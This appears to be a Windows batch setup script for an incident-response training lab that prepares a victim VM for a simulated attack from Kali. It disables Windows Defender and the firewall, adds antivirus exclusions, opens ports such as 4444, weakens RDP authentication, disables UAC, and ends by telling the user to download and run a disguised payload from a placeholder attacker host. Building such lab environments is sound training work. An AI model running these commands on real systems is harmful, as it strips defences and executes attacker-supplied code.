@echo off
:: ============================================================
:: DEPI IR Project - Windows 10 Lab Preparation
:: RUN AS ADMINISTRATOR on the Windows 10 victim machine
:: ============================================================

title DEPI IR Lab - Windows Setup
color 0A

echo.
echo  ============================================
echo   DEPI IR Project - Windows 10 Lab Setup
echo   Run as Administrator
echo  ============================================
echo.

:: ── Admin check ─────────────────────────────────────────────
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERROR] Right-click this file and choose "Run as administrator"
    pause
    exit /b 1
)
echo  [+] Administrator check passed
echo.

:: ── 1. Kill Windows Defender fully ──────────────────────────
echo  [*] Disabling Windows Defender...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableArchiveScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting Disabled" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1

:: Add exclusions for common payload locations
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Temp'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.exe'" >nul 2>&1

:: Disable via registry (survives reboot)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
echo  [+] Windows Defender: DISABLED
echo.

:: ── 2. Disable Windows Firewall ─────────────────────────────
echo  [*] Disabling Windows Firewall (all profiles)...
netsh advfirewall set allprofiles state off >nul 2>&1
powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" >nul 2>&1
echo  [+] Firewall: DISABLED
echo.

:: ── 3. Open all required ports ──────────────────────────────
echo  [*] Adding firewall rules for lab ports...
netsh advfirewall firewall add rule name="LAB-RDP"      protocol=TCP dir=in localport=3389 action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-SMB"      protocol=TCP dir=in localport=445  action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-HTTP"     protocol=TCP dir=in localport=80   action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-HTTPS"    protocol=TCP dir=in localport=443  action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-4444"     protocol=TCP dir=in localport=4444 action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-5555"     protocol=TCP dir=in localport=5555 action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-8080"     protocol=TCP dir=in localport=8080 action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-135"      protocol=TCP dir=in localport=135  action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-139"      protocol=TCP dir=in localport=139  action=allow >nul 2>&1
netsh advfirewall firewall add rule name="LAB-OUT"      protocol=TCP dir=out action=allow >nul 2>&1
echo  [+] Ports opened: 80, 135, 139, 443, 445, 3389, 4444, 5555, 8080
echo.

:: ── 4. Enable RDP ───────────────────────────────────────────
echo  [*] Enabling RDP...
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul 2>&1
echo  [+] RDP: ENABLED
echo.

:: ── 5. Disable UAC ──────────────────────────────────────────
echo  [*] Disabling UAC...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
echo  [+] UAC: DISABLED
echo.

:: ── 6. Create payload directory ─────────────────────────────
echo  [*] Creating payload directory...
if not exist "C:\Users\Public\Documents" mkdir "C:\Users\Public\Documents"
echo  [+] Directory ready: C:\Users\Public\Documents
echo.

:: ── 7. Show Windows IP ──────────────────────────────────────
echo  ============================================
echo   [!] YOUR WINDOWS IP ADDRESS:
echo  ============================================
ipconfig | findstr /i "IPv4"
echo  ============================================
echo.
echo  ============================================
echo   SETUP COMPLETE - NEXT STEPS:
echo  ============================================
echo.
echo  1. Note your Windows IP above
echo  2. Go to Kali and run:
echo       sudo bash kali_attack.sh
echo  3. When Kali shows the payload URL, run in PowerShell:
echo.
echo  Invoke-WebRequest -Uri "http://KALI_IP:8080/update_service.exe" -OutFile "C:\Users\Public\Documents\update_service.exe"
echo.
echo  4. Then run the payload:
echo  Start-Process "C:\Users\Public\Documents\update_service.exe"
echo.
pause
